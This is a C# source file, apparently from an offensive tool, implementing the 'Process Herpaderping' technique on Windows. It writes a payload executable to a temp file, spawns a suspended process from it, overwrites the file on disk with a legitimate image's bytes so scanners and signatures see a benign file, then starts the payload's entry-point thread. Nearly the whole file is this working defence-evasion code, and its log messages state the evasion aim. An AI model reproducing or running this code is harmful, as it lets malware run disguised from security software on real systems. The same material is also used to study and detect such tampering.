using System;
using System.Collections.Generic;
using System.IO;
using ProcessHerpaderping.Interop;

namespace ProcessHerpaderping.Library
{
    using NTSTATUS = Int32;

    internal class Modules
    {
        public static bool CreateHerpaderpingProcess(
            byte[] imageData,
            string commandLine,
            int ppid,
            string windowTitle)
        {
            NTSTATUS ntstatus;
            bool status;
            IntPtr hTempFile;
            IntPtr hHerpaderpingProcess;
            IntPtr pPeb;
            IntPtr pEntryPoint;
            IntPtr pRemoteImageBase;
            string imagePathName;
            string tempFilePath;
            bool is64BitImage;
            PeFile.IMAGE_FILE_MACHINE architecture;
            uint nAddressOfEntryPoint;
            byte[] fakeImageBytes;
            int nSizeFakeImage;
            int nSizePayload = imageData.Length;

            if (Environment.Is64BitProcess && (IntPtr.Size != 8))
            {
                Console.WriteLine("[!] In 64bit OS, target image's architecture should be built as 64bit binary.");

                return false;
            }
            else if (!Environment.Is64BitProcess && (IntPtr.Size != 4))
            {
                Console.WriteLine("[!] In 32bit OS, target image's architecture should be built as 32bit binary.");

                return false;
            }

            imagePathName = Helpers.ResolveImagePathName(commandLine);

            if (string.IsNullOrEmpty(imagePathName))
            {
                Console.WriteLine("[-] Failed to resolve image path name from command line.");

                return false;
            }

            try
            {
                using (var peFile = new PeFile(imagePathName))
                {
                    architecture = peFile.Architecture;
                    is64BitImage = peFile.Is64Bit;
                }

                fakeImageBytes = File.ReadAllBytes(imagePathName);
                nSizeFakeImage = fakeImageBytes.Length;

                Console.WriteLine("[*] Got target information.");
                Console.WriteLine("    [*] Image Path Name : {0}", imagePathName);
                Console.WriteLine("    [*] Architecture    : {0}", architecture);
                Console.WriteLine("    [*] Command Line    : {0}", commandLine);

                if (Environment.Is64BitProcess && !is64BitImage)
                    throw new InvalidDataException("In 64bit OS, target image's architecture should be x64.");
                else if (!Environment.Is64BitProcess && is64BitImage)
                    throw new InvalidDataException("In 32bit OS, target image's architecture should be x86.");

                using (var peImage = new PeFile(imageData))
                {
                    nAddressOfEntryPoint = peImage.GetAddressOfEntryPoint();

                    Console.WriteLine("[>] Analyzing PE image data.");

                    if (peImage.Architecture != architecture)
                        throw new InvalidDataException("Architecture mismatch.");
                }
            }
            catch (InvalidDataException ex)
            {
                Console.WriteLine("[!] {0}", ex.Message.ToString());

                return false;
            }
            catch
            {
                Console.WriteLine("[!] Unexpected exception is thrown.");

                return false;
            }

            if (nSizeFakeImage < nSizePayload)
            {
                Console.WriteLine("[!] Fake image size is less than payload image size.");
                Console.WriteLine("    Due to file lock, image data cannot be smaller after process execution.");
                Console.WriteLine("    This issue will corrupt signature and ruin the advantage of this technique.");
            }

            tempFilePath = Path.GetTempFileName();
            Console.WriteLine("[>] Trying to create payload file.");
            Console.WriteLine("    [*] File Path : {0}", tempFilePath);

            hTempFile = Utilities.GetHerpaderpingFileHandle(tempFilePath);

            if (hTempFile == Win32Consts.INVALID_HANDLE_VALUE)
            {
                Console.WriteLine("[-] Failed to open temp file.");
                Helpers.DeleteFile(tempFilePath);

                return false;
            }

            if (!Helpers.WriteDataIntoFile(hTempFile, imageData, false))
            {
                Console.WriteLine("[-] Failed to write payload.");
                NativeMethods.NtClose(hTempFile);
                Helpers.DeleteFile(tempFilePath);

                return false;
            }
            else
            {
                Console.WriteLine("[+] Payload is written successfully.");
            }

            Console.WriteLine("[>] Trying to create herpaderping process.");

            hHerpaderpingProcess = Utilities.CreateSuspendedProcess(hTempFile, ppid);

            if (hHerpaderpingProcess == IntPtr.Zero)
            {
                NativeMethods.NtClose(hTempFile);
                Helpers.DeleteFile(tempFilePath);

                return false;
            }
            else
            {
                Console.WriteLine("[+] Herpaderping process is created successfully.");
            }

            if (!Helpers.GetProcessBasicInformation(
                hHerpaderpingProcess,
                out PROCESS_BASIC_INFORMATION pbi))
            {
                Console.WriteLine("[-] Failed to get ntdll!_PEB for the herpaderping process.");
                NativeMethods.NtTerminateProcess(hHerpaderpingProcess, Win32Consts.STATUS_SUCCESS);
                NativeMethods.NtClose(hTempFile);
                Helpers.DeleteFile(tempFilePath);

                return false;
            }
            else
            {
                pPeb = pbi.PebBaseAddress;
                Console.WriteLine("[+] Got herpaderping process basic information.");
                Console.WriteLine("    [*] ntdll!_PEB : 0x{0}", pPeb.ToString((IntPtr.Size == 8) ? "X16" : "X8"));
                Console.WriteLine("    [*] Process ID : {0}", pbi.UniqueProcessId);
            }

            pRemoteImageBase = Helpers.GetImageBaseAddress(hHerpaderpingProcess, pPeb);

            if (pRemoteImageBase == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to get ntdll!_PEB for the herpaderping process.");
                NativeMethods.NtTerminateProcess(hHerpaderpingProcess, Win32Consts.STATUS_SUCCESS);
                NativeMethods.NtClose(hTempFile);
                Helpers.DeleteFile(tempFilePath);

                return false;
            }
            else
            {
                pEntryPoint = new IntPtr(pRemoteImageBase.ToInt64() + nAddressOfEntryPoint);
                Console.WriteLine(
                    "[*] Image base address for the herpaderping process is 0x{0}.",
                    pRemoteImageBase.ToString((IntPtr.Size == 8) ? "X16" : "X8"));
            }

            Console.WriteLine("[+] Trying to update image file to fake image.");

            status = Helpers.WriteDataIntoFile(hTempFile, fakeImageBytes, true);
            NativeMethods.NtClose(hTempFile);

            if (!status)
            {
                Console.WriteLine("[-] Failed to write fake image data.");
                NativeMethods.NtTerminateProcess(hHerpaderpingProcess, Win32Consts.STATUS_SUCCESS);
                Helpers.DeleteFile(tempFilePath);

                return false;
            }
            else
            {
                Console.WriteLine("[+] Fake image data is written successfully.");

                if (nSizeFakeImage < nSizePayload)
                    Console.WriteLine("[!] Image file shrinking should be failed.");
            }

            if (Utilities.SetProcessParameters(
                hHerpaderpingProcess,
                imagePathName,
                commandLine,
                Environment.CurrentDirectory,
                windowTitle) == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to set process parameters for the herpaderping process.");
                NativeMethods.NtTerminateProcess(hHerpaderpingProcess, Win32Consts.STATUS_SUCCESS);
                Helpers.DeleteFile(tempFilePath);

                return false;
            }

            Console.WriteLine("[>] Trying to start herpaderping process thread.");

            ntstatus = NativeMethods.NtCreateThreadEx(
                out IntPtr hThread,
                ACCESS_MASK.THREAD_ALL_ACCESS,
                IntPtr.Zero,
                hHerpaderpingProcess,
                pEntryPoint,
                IntPtr.Zero,
                false,
                0,
                0,
                0,
                IntPtr.Zero);
            NativeMethods.NtClose(hHerpaderpingProcess);

            if (ntstatus != Win32Consts.STATUS_SUCCESS)
            {
                Console.WriteLine("[-] Failed to create thread.");
                Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
                Helpers.DeleteFile(tempFilePath);

                return false;
            }
            else
            {
                Console.WriteLine("[+] Thread is resumed successfully.");
            }

            Console.WriteLine("[*] This technique remains payload file. Remove it mannually.");
            Console.WriteLine("    [*] Payload File Path : {0}", tempFilePath);

            NativeMethods.NtClose(hThread);

            return true;
        }
    }
}
